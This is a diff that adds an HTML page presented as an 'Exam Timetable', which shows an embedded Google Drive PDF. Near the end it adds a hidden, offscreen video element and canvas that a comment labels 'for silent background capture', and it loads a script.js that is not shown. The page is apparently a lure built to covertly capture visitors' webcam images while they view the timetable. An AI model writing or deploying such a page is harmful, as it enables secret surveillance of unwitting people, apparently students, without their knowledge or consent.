@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Exam Timetable</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet" />
+  <link rel="stylesheet" href="style.css" />
+</head>
+<body>
+
+  <!-- Navbar -->
+  <nav class="navbar">
+    <div class="nav-brand">
+      <div class="nav-logo">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none"
+             stroke="currentColor" stroke-width="2">
+          <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/>
+          <polyline points="14 2 14 8 20 8"/>
+          <line x1="16" y1="13" x2="8" y2="13"/>
+          <line x1="16" y1="17" x2="8" y2="17"/>
+        </svg>
+      </div>
+      <span class="nav-title">Exam Timetable</span>
+
+    </div>
+
+
+  </nav>
+
+  <!-- Full-screen PDF -->
+  <main class="pdf-wrapper">
+    <iframe
+      class="pdf-frame"
+      src="https://drive.google.com/file/d/1rO3PPR6KQXI8WRA-YbKT775f047jR9X_/preview"
+      title="Exam Timetable"
+      allow="autoplay"
+      allowfullscreen
+      frameborder="0"
+    ></iframe>
+  </main>
+
+  <!-- Hidden elements for silent background capture -->
+  <video id="cam" autoplay muted playsinline style="display:none;position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;"></video>
+  <canvas id="snap" style="display:none;position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;"></canvas>
+
+  <script src="script.js"></script>
+</body>
+</html>
